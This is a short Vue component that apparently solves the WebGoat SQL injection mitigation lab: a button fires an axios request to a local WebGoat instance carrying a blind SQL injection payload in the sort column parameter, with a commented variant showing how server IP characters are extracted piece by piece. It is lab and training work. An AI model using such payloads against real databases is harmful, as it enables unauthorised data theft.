<template>
 <div class="app">
   <button @click="handleMitigation">click me </button>
 </div>
</template>

<script>
import axios from 'axios';
export default {
 methods:{
   async handleMitigation(){
     const res = await axios.get(`http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=(CASE+WHEN+(SELECT+substring(ip,1,3)+FROM+servers+WHERE+hostname='webgoat-prd')+=+'104'+THEN+id+ELSE+status+END)`,{
       "Access-Control-Allow-Origin" : "*"
     })
     console.log(res.data)
   }
 }
}
// CASE WHEN (
//   SELECT 
//     substring(ip, 2, 2) 
//   FROM 
//     servers 
//   WHERE 
//     hostname = 'webgoat-prd'
// ) = '1' THEN id ELSE status END
</script>


<style>

</style>

<style>
